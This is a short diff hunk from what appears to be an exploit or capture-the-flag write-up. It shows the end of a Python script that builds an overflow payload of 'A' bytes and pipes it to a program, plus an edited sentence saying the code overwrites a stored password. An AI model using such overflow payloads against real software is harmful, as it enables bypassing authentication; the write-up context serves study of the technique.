@@ -23,4 +23,4 @@ payload += b"A"*0x5D4
 sys.stdout.buffer.write(str(p1).encode() + b"\n" + payload + b"\n")
 ```
 
-this python code overwrite the real password with 9 A's and 
+this python code overwrite the real password with 9 A's and do basically everything else
